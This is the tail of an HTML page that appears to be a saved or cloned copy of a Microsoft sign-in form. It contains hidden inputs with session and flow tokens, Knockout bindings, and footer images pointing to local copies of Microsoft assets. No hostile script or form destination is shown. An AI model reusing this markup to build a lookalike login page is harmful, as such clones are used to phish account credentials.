value="eRoks530Jyces2YacF7gT9tb3eRAVfzAOwhb/BkdvCk=0:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXWSO2_TUACF47gNLUJQWGBB6sCElMTv2JEi1amTNjR2aHLTyFkiP65jx6_0-jpW_AsQUyeGjCxAJ0SFhPgJHVBnRiZUMSCmDgy03VnO9A1H5zvPSbpC159xLMcbNVMqS4bAljmJpsoGxwhllmcFlqFom6dY9Oju1ptfZ2ZtddX64A3-fmwoy1PisYvxPKlXq1mWVWLH8SxYseKw-oUgLgjiJ0GsiuswKg8Hp8VEYAWRp5gaJfA1kZdEkarooMP3Rm13DKZYBUNO8yhKZ4Zcd9TiVHCIx2Hb14DKaWGLH4OjmQrcmQ6GubrXwmNlyuq3vOZ2wZTTchlrTD_ojXROn9mhNhr734sPenKKXeYmYuTl8E9x04lROJnHCV6R74jeHEYdezeOImjhyg0GI-xZBvbi6CWK5xBhDyaNpmUmg3TSx_KxPRnaQXZo0vvHzgRxzBIli3ymL510nwnKZrbQmnybbmuOHoB2KOxxPp26gD5ojo58tb-QLFHpyiI7YVVJkgeOSc-QQtHN_dgc7sLuYKYcKNpebuXcMcCC0knlMPNqn8jS9axhHJ2T969LRZ69PUex4wXwB_nUDL0ggGgnNKLUMSycIogSaE9vVVysEZdr9yiyvrFR2iKeFLYLV2vE2_Vrm--_kWcHlw87q53PXbR8XThfr8J-7Cc8S71YWjBhdMNq16ZAwiYL-_KRk8u9zDWrTd9e7PoNsU6flIiTUul3qfjqTuHr5v--8A81"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="bb35e3d2-cb4f-414d-9305-1e850eda3100"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAACEfexXxjamQb3OeGQ4Gugv0upg2lBh_d4IY-D66qFQkXS0s283qnwpCp_iJ7pjDMadp02e6B4GcTZDfwEvmtY5rWp-D4Y9oECxzVa7w2CMPq0oW09q7FpWc8yLcTskLw8LpXqgPL6xKw1lbYzxtwBLcy-o68JnNEd6lB7ELMJlLz3o12AbN_9FuBWwJl3-UKgxGonEw_WaoJEQs26GLeUl_fXko8R3qtvhlH9Lhz-3e8Cy0U0p-XSPicHcg5VkIYHmgZutfrezdttLnLhwLE-tC9lGqjDJfJhfIjhcaQvU0Arc9M7IomFKcOhi1VC-QcpjAOwr5tjNfoHaGSYosz69sNqzaACOdzBCJA5KR_LPU7Nc8FaQe9JIEe-kgYOlDanptTl6s2SnSCdNq8xWlgTlUlZw_Fk0FF3FHElFIvsMNC_RAygp32VniprzxAF7MGEgAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2020 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#servicesagreement">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="office/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="office/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl && !svr.urlMsaStaticMeControl --><!-- /ko --><!-- ko if: svr.urlMsaStaticMeControl && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"></div> <!-- /ko --></div></body></html>